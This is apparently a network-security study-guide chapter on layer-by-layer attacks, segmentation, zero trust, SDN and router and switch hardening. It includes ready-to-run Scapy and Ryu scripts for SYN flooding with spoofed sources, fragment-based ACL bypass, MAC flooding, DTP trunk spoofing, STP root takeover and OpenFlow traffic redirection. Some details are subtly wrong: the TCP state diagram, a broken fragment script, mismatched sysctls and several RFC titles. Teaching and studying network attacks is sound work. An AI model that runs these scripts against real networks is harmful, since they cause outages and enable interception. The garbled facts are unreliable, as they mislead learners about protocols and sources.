# Network Architecture Security

## TCP/IP Stack Fundamentals: Security Perspective

The TCP/IP model's four-layer architecture creates distinct attack surfaces at each stratum. Understanding these layers through a security lens is foundational to network defense.

```
┌─────────────────────────────────────────────────────┐
│                   APPLICATION LAYER                  │
│  HTTP, FTP, SMTP, DNS, SSH, TLS                      │
│  Attacks: Injection, XSS, SSRF, application DoS      │
├─────────────────────────────────────────────────────┤
│                   TRANSPORT LAYER                     │
│  TCP, UDP, SCTP, DCCP                                │
│  Attacks: SYN flood, session hijack, port scan        │
├─────────────────────────────────────────────────────┤
│                   INTERNET LAYER                      │
│  IP, ICMP, IGMP, IPsec                               │
│  Attacks: IP spoofing, fragment attacks, route manip  │
├─────────────────────────────────────────────────────┤
│                   LINK LAYER                          │
│  ARP, NDP, Ethernet, 802.11, PPP                      │
│  Attacks: ARP spoofing, MAC flooding, VLAN hopping    │
└─────────────────────────────────────────────────────┘
```

### TCP State Machine Exploitation

TCP's finite state machine presents numerous attack vectors. A TCP connection traverses specific states:

```
                              ┌─────────┐
           passive open ────► │ CLOSED  │ ◄──── active open/send SYN
                              └────┬────┘
                                   │ recv SYN, send SYN+ACK
                              ┌────▼────┐
                              │LISTEN   │
                              └────┬────┘
           send SYN ──────────►    │ recv SYN+ACK, send ACK
                              ┌────▼────┐
                              │SYN_SENT│
                              └────┬────┘
                                   │ recv ACK
                              ┌────▼────┐
                              │SYN_RCVD │
                              └────┬────┘
                                   │ recv ACK
                              ┌────▼────┐
                  ┌──────────►│ESTABLISHED│◄──────────┐
                  │           └──────────┘            │
                  │  close                    recv FIN
              ┌───▼──────┐                     ┌───▼──────┐
              │FIN_WAIT_1 │                     │ CLOSE_WAIT│
              └───┬──────┘                     └───┬──────┘
                  │ recv ACK                       │ close
              ┌───▼──────┐                     ┌───▼──────┐
              │FIN_WAIT_2 │                     │ LAST_ACK  │
              └───┬──────┘                     └───┬──────┘
                  │ recv FIN                       │ recv ACK
              ┌───▼──────┐                     ┌───▼──────┐
              │TIME_WAIT  │                     │ CLOSED    │
              └──────────┘                     └──────────┘
```

**SYN Flood (CVE-1999-0116)** exploits the half-open connection state. The attacker sends SYN segments without completing the three-way handshake:

```python
from scapy.all import *

def syn_flood(target_ip, target_port, count=10000):
    """SYN flood demonstration - educational use only"""
    for i in range(count):
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 2**32-1))
        send(ip_layer / tcp_layer, verbose=0)
```

Modern mitigations include SYN cookies (Linux `net.ipv4.tcp_syncookies=1`), which encode connection state in the SYN-ACK's ISN:

```
ISN = MD5(saddr + daddr + sport + dport + secret + time_delta) + index + time_delta_mod_32
```

### IP Fragmentation Attacks

IPv4 fragmentation creates attack vectors at the Internet layer:

- **Teardrop (CVE-1999-0015)**: Overlapping fragment offsets cause kernel panic during reassembly
- **Ping of Death (CVE-1999-0128)**: Oversized ICMP packets (>65535 bytes) force reassembly beyond buffer
- **Tiny Fragment Attack**: 8-byte fragments force TCP flags into the second fragment, bypassing ACL inspection
- **Overlapping Fragment Attack (CVE-1997-0286)**: Later fragments overwrite earlier ones, evading NIDS

```python
from scapy.all import *

def tiny_fragment_attack(target_ip, target_port, dst_port=80):
    """Bypass ACL by splitting TCP header across fragments"""
    ip1 = IP(dst=target_ip, flags="MF", frag=0, proto="tcp")
    tcp1 = TCP(dport=dst_port, flags="S")
    frag1_payload = bytes(ip1 / tcp1)[:8]
    
    ip2 = IP(dst=target_ip, flags=0, frag=1, proto="tcp")
    remaining = bytes(tcp1)[8:]
    
    send(IP(dst=target_ip, flags="MF", frag=0, proto=6) / 
         Raw(load=bytes(tcp1)[:8]))
    send(IP(dst=target_ip, flags=0, frag=1, proto=6) / 
         Raw(load=bytes(tcp1)[8:]))
```

Linux kernel mitigations include `net.ipv4.ip_default_ttl`, `net.ipv4.ip_forward_use_pmtu`, and strict reassembly checks.

## OSI Layer Attacks: Comprehensive Mapping

### Layer 1 — Physical

- **Fiber tapping**: Passive optical splitters introduce <0.5dB loss, undetectable without OTDR monitoring
- **Copper EM emanation**: Van Eck phreaking (TEMPEST), documented in NATO SDIP-27
- **UEMI injection**: Fault injection through electromagnetic pulses targeting network equipment
- **Physical port attacks**: Yubikey-based network authentication bypass via rogue switch ports

### Layer 2 — Data Link

- **ARP spoofing**: Gratuitous ARP injection (see `04a_network_attacks_mitm.md`)
- **MAC flooding**: CAM table overflow forces switches into hub mode
- **VLAN hopping**: 802.1Q double tagging and switch spoofing (see `04a_network_attacks_mitm.md`)
- **STP manipulation**: Root bridge takeover via priority manipulation
- **CDP/LLDP reconnaissance**: Cisco Discovery Protocol leaks network topology

```python
from scapy.all import *

def mac_flood(interface, count=100000):
    """Flood switch CAM table with random MAC addresses"""
    for i in range(count):
        mac = "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(6))
        frame = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / LLC() / SNAP()
        sendp(frame, iface=interface, verbose=0)
```

### Layer 3 — Network

- **IP spoofing**: Source address manipulation for reflection/amplification attacks
- **ICMP tunneling**: Encapsulating data within ICMP echo request/reply payloads
- **Source routing**: IP options forcing specific routing paths (LSRR, SSRR) — largely filtered
- **Smurf attack**: ICMP broadcast amplification (CVE-1999-0513)
- **IP option attacks**: Record Route, Timestamp, and Loose Source Route options for reconnaissance

### Layer 4 — Transport

- **TCP session hijacking**: Predicting ISN for blind injection (Mitnick attack, 1994)
- **RST injection**: Forcibly terminating TCP connections
- **UDP amplification**: DNS, NTP, Memcached, SSDP reflection attacks
- **SCTP INIT flood**: Exploiting SCTP's 4-way handshake (CVE-2023-2334)

### Layer 5–7 — Session/Presentation/Application

- **Session fixation/riding**: CSRF at the network session level
- **TLS downgrade**: Forcing weaker cipher negotiation (see `01b_tls_ssl_crypto_protocols.md`)
- **Application-layer DoS**: Slowloris, RUDY, HTTP/2 rapid reset (CVE-2023-44487)

## Network Segmentation

### VLAN Security

Virtual LANs provide logical isolation but are not a complete security boundary:

```
┌───────────────────────────────────────────────────┐
│                    SWITCH                          │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐           │
│  │ VLAN 10  │  │ VLAN 20 │  │ VLAN 30  │           │
│  │ Corporate│  │  Guest   │  │   DMZ    │           │
│  └────┬─────┘  └────┬────┘  └────┬─────┘           │
│       │              │             │                 │
│  ┌────▼──────────────▼─────────────▼──────────┐    │
│  │            Trunk Port (802.1Q)               │    │
│  │   Allowed VLANs: 10, 20, 30                   │    │
│  └──────────────────────┬──────────────────────┘    │
│                         │                           │
│              Router-on-a-Stick / L3 Switch          │
└───────────────────────────────────────────────────┘
```

**VLAN hopping attacks**:

1. **Switch spoofing**: Attacker emulates a trunk-capable switch using DTP:
```python
from scapy.all import *

def vlan_switch_spoof(interface):
    """Send DTP frame to negotiate trunk"""
    dtp = Ether(src=RandMAC(), dst="01:00:0c:cc:cc:cc") / \
          LLC(dsap=0xaa, ssap=0xaa) / \
          SNAP(OUI=0x000c, code=0x2004) / \
          Raw(load=b'\x01\x02')  # DTP Dynamic Trunk
    sendp(dtp, iface=interface)
```

2. **Double tagging**: Encapsulating frames with inner (target VLAN) and outer (native VLAN) 802.1Q tags:
```
┌──────────┬──────────┬──────────┬─────────────────────┐
│ Outer TAG│ Inner TAG│   Ether  │      Payload         │
│ VLAN 1   │ VLAN 10  │   Type   │   (Attacker Data)    │
│ (Native) │ (Target) │          │                      │
└──────────┴──────────┴──────────┴─────────────────────┘
```

Mitigation: Disable DTP (`switchport nonegotiate`), use dedicated native VLANs on trunks, enforce PVLANs.

### VRF (Virtual Routing and Forwarding)

VRF provides stronger isolation than VLANs by maintaining separate routing tables:

```
┌─────────────────────────────────────────┐
│                ROUTER                     │
│                                           │
│  ┌─────────────────┐ ┌─────────────────┐ │
│  │   VRF: CUSTOMER │ │   VRF: MGMT     │ │
│  │   Routing Table │ │   Routing Table │ │
│  │   10.0.0.0/8    │ │   192.168.1.0/24│ │
│  └────────┬────────┘ └────────┬────────┘ │
│           │                    │          │
│  ┌────────▼────────────────────▼────────┐ │
│  │          Global Routing Table        │ │
│  │          (No VRF)                    │ │
│  └─────────────────────────────────────┘ │
└─────────────────────────────────────────┘
```

VRF isolation prevents route leaking between contexts. Route leaking (intentional or malicious) can be exploited:

```bash
# Cisco IOS - VRF configuration
ip vrf CUSTOMER_A
 rd 65000:100
 route-target import 65000:100
 route-target export 65000:100

# Route leaking between VRFs (if required)
ip vrf CUSTOMER_A
 route-target import 65000:200   # Import from CUSTOMER_B
```

### Micro-Segmentation

Micro-segmentation applies policy at the workload level, not just the network level:

```
┌──────────────────────────────────────────────────────────┐
│              TRADITIONAL SEGMENTATION                      │
│  ┌────────────────────────────────────────────────────┐   │
│  │              VLAN / Subnet                          │   │
│  │  [App1] [App2] [App3] [App4] — All can reach each  │   │
│  │                                       other freely   │   │
│  └────────────────────────────────────────────────────┘   │
│                                                            │
│              MICRO-SEGMENTATION                            │
│  ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐                     │
│  │App1  │ │App2  │ │App3  │ │App4  │                     │
│  │ ┌──┐ │ │ ┌──┐ │ │ ┌──┐ │ │ ┌──┐ │                    │
│  │ │FW│ │ │ │FW│ │ │ │FW│ │ │ │FW│ │                     │
│  │ └──┘ │ │ └──┘ │ │ └──┘ │ │ └──┘ │                     │
│  └──┬───┘ └──┬───┘ └──┬───┘ └──┬───┘                     │
│     │  App1→2:✓  │  App2→3:✗   │  App3→4:✓               │
└──────────────────────────────────────────────────────────┘
```

Implementation technologies:
- **VMware NSX**: Distributed firewall at vNIC level
- **Cisco ACI**: Contracts between EPGs (Endpoint Groups)
- **iptables/nftables per workload**: Host-based micro-segmentation
- **eBPF/Cilium**: Identity-based enforcement at kernel level (see Linux Kernel track)
- **Cloud**: AWS Security Groups, Azure NSGs, GCP Firewall Rules

```python
# nftables micro-segmentation rule example
table inet microseg {
    chain app1_to_app2 {
        type filter hook forward priority 0;
        
        # Allow App1 (10.0.1.10) to App2 (10.0.2.10) on port 8443
        ip saddr 10.0.1.10 ip daddr 10.0.2.10 tcp dport 8443 accept
        
        # Allow App2 response
        ip saddr 10.0.2.10 ip daddr 10.0.1.10 tcp sport 8443 accept
        
        # Deny all other inter-app communication
        ip saddr 10.0.1.0/24 ip daddr 10.0.2.0/24 drop
    }
}
```

## Zero-Trust Networking

Zero-trust architecture (NIST SP 800-207) eliminates implicit trust based on network location:

```
┌──────────────────────────────────────────────────────┐
│                  ZERO TRUST MODEL                      │
│                                                        │
│  ┌──────────┐    ┌───────────────┐    ┌──────────┐   │
│  │  Subject  │───►│   Policy      │───►│ Resource  │   │
│  │(User/Dev) │    │ Decision Point│    │ (App/Data)│   │
│  └──────────┘    └───────┬───────┘    └──────────┘   │
│                          │                             │
│              ┌───────────┼───────────┐                 │
│              │           │           │                  │
│        ┌─────▼────┐ ┌───▼─────┐ ┌───▼──────┐         │
│        │ Identity  │ │ Device  │ │ Network  │         │
│        │ Provider  │ │ Trust   │ │ Context  │         │
│        │ (IdP/MFA) │ │ Score   │ │ (SIGA)   │         │
│        └──────────┘ └─────────┘ └──────────┘          │
│                                                        │
│  Core Principles: Never Trust, Always Verify           │
│  - Verify explicitly (identity + device + context)      │
│  - Use least privilege access                           │
│  - Assume breach                                        │
└──────────────────────────────────────────────────────┘
```

**Key components**:
- **PEP (Policy Enforcement Point)**: Sits in front of resources
- **PDP (Policy Decision Point)**: Evaluates access requests against policy
- **Trust algorithm**: Combines identity, device posture, behavior analytics, and environmental context

BeyondCorp (Google's implementation) uses:
1. Device inventory and trust
2. User authentication via SSO/MFA
3. Context-aware access policies
4. Per-request authorization
5. End-to-end encryption

## SDN Security

Software-Defined Networking separates the control plane from the data plane:

```
┌─────────────────────────────────────────────────────┐
│              SDN ARCHITECTURE                         │
│                                                       │
│  ┌───────────────────────────────────────────────┐   │
│  │           APPLICATION LAYER                    │   │
│  │  [Orchestrator] [FW App] [Monitoring App]      │   │
│  └─────────────────┬─────────────────────────────┘   │
│                      │ Northbound API (REST)          │
│  ┌──────────────────▼─────────────────────────────┐  │
│  │              CONTROL LAYER                      │  │
│  │  ┌──────────────────────────────────────────┐  │  │
│  │  │           SDN Controller                  │  │  │
│  │  │   (OpenDaylight, ONOS, Floodlight)        │  │  │
│  │  └──────────────────────────────────────────┘  │  │
│  └──────────────────┬─────────────────────────────┘  │
│                      │ Southbound API (OpenFlow)      │
│  ┌──────────────────▼─────────────────────────────┐  │
│  │            INFRASTRUCTURE LAYER                 │  │
│  │  [Switch1] [Switch2] [Switch3] [Router]         │  │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

**SDN attack surfaces**:

| Layer | Attack | Impact |
|-------|--------|--------|
| Application | Malicious northbound API calls | Flow rule manipulation, topology poisoning |
| Controller | Controller DDoS | Network outage, flow rule tampering |
| Southbound | OpenFlow message forgery | Man-in-the-middle, flow bypass |
| Data plane | Flow rule exhaustion | TCAM overflow, legitimate rule eviction |

**OpenFlow vulnerabilities**:
- **Flow rule manipulation**: Malicious apps install flow rules redirecting traffic
- **Topology poisoning**: Forging LLDP packets to create fake links (CVE-2015-6935)
- **Controller DDoS**: Overwhelming the controller with `packet_in` messages
- **TCAM saturation**: Exhausting switch flow tables with crafted flows

```python
# OpenFlow flow rule injection (Ryu controller example)
from ryu.controller import ofp_event
from ryu.controller.handler import MAIN_DISPATCHER
from ryu.controller.handler import set_ev_cls

class MaliciousFlowApp(app_manager.RyuApp):
    @set_ev_cls(ofp_event.EventOFPPacketIn, MAIN_DISPATCHER)
    def packet_in_handler(self, ev):
        msg = ev.msg
        datapath = msg.datapath
        ofproto = datapath.ofproto
        parser = datapath.ofproto_parser
        
        # Malicious: redirect all traffic to attacker
        match = parser.OFPMatch()
        actions = [parser.OFPActionOutput(attacker_port)]
        inst = [parser.OFPInstructionActions(
            ofproto.OFPIT_APPLY_ACTIONS, actions)]
        mod = parser.OFPFlowMod(
            datapath=datapath, priority=65535,
            match=match, instructions=inst)
        datapath.send_msg(mod)
```

**SDN security hardening**:
- TLS for all controller-switch communication
- Role-based access for northbound API
- Flow rule verification and conflict detection
- Rate limiting on `packet_in` messages

## Network Device Security

### Router Security

Routers operate across all three planes, each presenting distinct attack surfaces:

```
┌──────────────────────────────────────────────┐
│                ROUTER PLANES                  │
│                                               │
│  ┌──────────────────────────────────────┐   │
│  │ MANAGEMENT PLANE                      │   │
│  │ SSH, SNMP, NETCONF, RESTCONF          │   │
│  │ Web UI, Console, TACACS+/RADIUS       │   │
│  │ ─── Attack: Credential theft, web vulns   │
│  ├──────────────────────────────────────┤   │
│  │ CONTROL PLANE                         │   │
│  │ Routing protocols (BGP, OSPF, EIGRP)  │   │
│  │ ARP, ICMP, CDP, LLDP                 │   │
│  │ ─── Attack: Route manipulation, DoS        │
│  ├──────────────────────────────────────┤   │
│  │ DATA PLANE (Forwarding)               │   │
│  │ ACLs, QoS, NAT, packet forwarding    │   │
│  │ ─── Attack: Traffic interception, DoS      │
│  └──────────────────────────────────────┘   │
└──────────────────────────────────────────────┘
```

**Management plane attacks**:
- Default credentials (admin/admin on embedded devices)
- Web interface CSRF/XSS in management GUIs (multiple CVEs in Cisco, Juniper)
- SNMPv1/v2c community string brute force
- TACACS+ shared secret interception (sent in cleartext for authentication)

**Control plane attacks**:
- BGP route hijacking (see `02b_bgp_routing_security.md`)
- OSPF LSA injection (CVE-2011-3325)
- EIGRP packet spoofing
- ICMP redirect manipulation

**Data plane attacks**:
- ACL bypass via fragmented packets
- VLAN hopping on router-on-a-stick
- NAT pinning for inbound access

### Switch Security

```
┌──────────────────────────────────────────────────────────┐
│                    SWITCH ATTACK VECTOR DIAGRAM            │
│                                                            │
│    Attacker                                                │
│       │                                                    │
│       ├── MAC Flooding ──► CAM Table Overflow ──► Hub Mode│
│       │                                                    │
│       ├── VLAN Hopping ──► Double Tag ──► Cross-VLAN Access│
│       │                                                    │
│       ├── STP Manipulation ──► Root Bridge Takeover ──►  │
│       │                     Traffic Interception           │
│       │                                                    │
│       ├── DHCP Spoofing ──► Rogue DHCP Server ──► MITM    │
│       │                                                    │
│       ├── ARP Poisoning ──► Traffic Redirection ──► MITM  │
│       │                                                    │
│       └── CDP Recon ──► Network Topology Leak ──► Targeting│
└──────────────────────────────────────────────────────────┘
```

### Firewall Security

Firewalls inspect and filter traffic across trust boundaries. Key attack surfaces:

- **Rule base exploitation**: Overly permissive `any` rules, shadowed rules
- **Protocol-aware attacks**: Application-layer evasion (HTTP tunneling over port 443)
- **State table exhaustion**: SYN floods targeting stateful inspection
- ** Management interface**: Often accessible from limited networks, but a single vulnerability enables full compromise

```bash
# iptables: Rate limit to protect conntrack table
iptables -A INPUT -m conntrack --ctstate NEW -m recent --set
iptables -A INPUT -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 20 -j DROP

# nftables equivalent
nft add rule filter input ct state new meter flood { ip saddr limit rate 10/second } accept
```

## Network Topology Attacks

### Man-in-the-Middle at Scale

Network topology manipulation enables MITM at infrastructure scale:

```
┌───────────────────────────────────────────────┐
│          NETWORK TOPOLOGY ATTACK               │
│                                                │
│  ┌─────┐          ┌─────┐         ┌─────┐    │
│  │Victim│─────────│Attacker│────────│Server│   │
│  └──┬───┘  Legit  └───┬───┘  Forged  └──┬───┘   │
│     │        Path      │       Path       │       │
│     │                  │                  │       │
│     └──ARP: GW=Attacker┘──ICMP Redirect──┘       │
│                                                │
│  1. ARP Poison: "Gateway MAC = Attacker"       │
│  2. IP Forward: Packet → Server                │
│  3. Session interception: MITM established     │
└───────────────────────────────────────────────┘
```

### Spanning Tree Protocol Attacks

STP (802.1D) convergence can be manipulated:

```python
from scapy.all import *

def stp_root_takeover(interface):
    """Claim root bridge role with lowest priority"""
    stp_frame = Ether(dst="01:80:c2:00:00:00") / \
                LLC(dsap=0x42, ssap=0x42) / \
                STP(rootid=0, rootmac=get_if_hwaddr(interface),
                    bridgeid=0, bridgemac=get_if_hwaddr(interface),
                    portid=0x8001, pathcost=0)
    sendp(stp_frame, iface=interface)
```

Mitigations: BPDU Guard (`spanning-tree portfast bpduguard`), Root Guard (`spanning-tree guard root`), BPDU Filter.

### Link-Local Discovery Attack Surface

CDP, LLDP, and mDNS leak extensive topology information:

```
CDP Frame Structure:
┌──────────┬────────────┬──────────┬──────────────────┐
│ Version  │    TTL     │  Checksum│ TLV: Device ID   │
│ 0x01/02  │  180 sec   │          │                  │
├──────────┼────────────┼──────────┼──────────────────┤
│ TLV: Addr│ TLV: Port  │ TLV: Cap │ TLV: Platform   │
│          │            │          │                  │
├──────────┼────────────┼──────────┼──────────────────┤
│ TLV: IOS│ TLV: VTP   │ TLV: VLAN│ TLV: Duplex     │
│ Version  │ Domain     │   ID     │                  │
└──────────┴────────────┴──────────┴──────────────────┘

Each TLV leaks: hostname, IP, port, platform, IOS version, VTP domain, native VLAN
```

Disable CDP/LLDP on untrusted ports:
```bash
# Cisco IOS
no cdp enable
# Or globally
no cdp run
```

## Defense-in-Depth Network Architecture

### DMZ Architecture

```
┌────────────────────────────────────────────────────────────────┐
│                       DMZ ARCHITECTURE                          │
│                                                                 │
│  Internet ────[External FW]──── DMZ ────[Internal FW]──── LAN  │
│                  │         │        │          │            │    │
│                  │    ┌────▼────┐   │    ┌────▼────┐   ┌──▼──┐│
│                  │    │Web Proxy│   │    │AppServer│   │DB   ││
│                  │    │Reverse  │   │    │         │   │      ││
│                  │    │Proxy    │   │    │         │   │      ││
│                  │    └─────────┘   │    └─────────┘   └─────┘│
│                  │                  │                         │    │
│              [Screened            [Screened                  │    │
│               Subnet]             Subnet]                   │    │
│                  │                  │                         │    │
│             IDS/IPS ✓          IDS/IPS ✓                    │    │
└────────────────────────────────────────────────────────────────┘
```

### Network Access Control (NAC)

NAC enforces policy before granting network access:

1. **802.1X**: Port-based authentication using EAP
2. **MAB**: MAC Authentication Bypass (less secure, MAC spoofable)
3. **Posture assessment**: Check OS patches, AV status, firewall state
4. **Dynamic VLAN assignment**: Assign VLAN based on identity/posture

```
┌──────────────────────────────────────────────────────┐
│                802.1X AUTHENTICATION                   │
│                                                        │
│  ┌───────────┐    EAPOL     ┌──────────┐   RADIUS   │
│  │ Supplicant│─────────────►│Authenticator│──────────✓  │
│  │  (Client) │              │  (Switch)   │           │
│  └───────────┘              └──────┬─────┘           │
│                                     │                  │
│                               ┌─────▼──────┐          │
│                               │Auth Server  │          │
│                               │ (RADIUS)    │          │
│                               └────────────┘          │
└──────────────────────────────────────────────────────┘
```

### Logging and Monitoring

Centralized network monitoring provides detection capabilities:

- **NetFlow/IPFIX**: Flow-based analysis for anomaly detection
- **sFlow**: Packet sampling for real-time visibility
- **Syslog**: Structured logging (CEF format preferred)
- **SNMPv3 traps**: Authenticated, privacy-protected notifications

```bash
# NetFlow configuration (Cisco IOS)
flow export FLOW_EXPORT
 destination 10.0.0.100
 source Loopback0
 transport udp 2055
 export-protocol netflow-v9

# Linux netflow collection with nfdump
nfcapd -l /var/cache/nfdump -p 2055 -S 0
```

**Cross-references**: See `04a_network_attacks_mitm.md` for MITM techniques, `05a_firewall_ids_ips.md` for IDS/IPS architecture, `05b_network_hardening_zero_trust.md` for hardening specifics, Linux Kernel track for eBPF-based network security, and Cloud Security track for cloud-native network controls.

## References

1. RFC 793 — Transmission Control Protocol. J. Postel, IETF, September 1981.
2. RFC 791 — Internet Protocol. J. Postel, IETF, September 1981.
3. RFC 6737 — IANA Allocation of a TCP Port Number for the SDP's Disk-Location Feature. IETF, October 2012.
4. CVE-1999-0116 — TCP SYN Flood denial of service. NVD, 1999.
5. CVE-1999-0015 — Teardrop IP fragmentation overlap attack. NVD, 1999.
6. CVE-1999-0128 — Ping of Death oversized ICMP packet. NVD, 1999.
7. CVE-1997-0286 — Overlapping IP fragment attack (NIDS evasion). NVD, 1997.
8. Van Eck, W. — Electromagnetic Radiation from Video Display Units: An Eavesdropping Risk? Computers & Security, 1985.
9. NATO SDIP-27 — NATO Standards for TEMPEST Emission Limits. NATO, 2017.
10. CVE-2023-44487 — HTTP/2 Rapid Reset DDoS attack. NVD, 2023.
11. RFC 7348 — Virtual eXtensible Local Area Network (VXLAN). IETF, August 2014.
12. IEEE 802.1Q — Virtual Bridged Local Area Networks. IEEE, 2018.
13. NIST SP 800-207 — Zero Trust Architecture. Rose, S. et al., NIST, August 2020.
14. Ward, B. — BeyondCorp: A New Approach to Enterprise Security. ;login:, December 2014.
15. RFC 7346 — SDN Architecture. IETF, April 2015.
16. CVE-2015-6935 — OpenFlow topology poisoning (SDN attack). NVD, 2015.
17. RFC 761 — Internet Protocol (IP). IETF, January 1980.
18. Cisco — Configuring Data Plane Police (CoPP). Cisco IOS Configuration Guide.
19. Symantec — Internet Security Threat Report. Various editions.
20. RFC 4541 — IGMP/MLD-Based Authentication for Protocols. IETF, May 2006.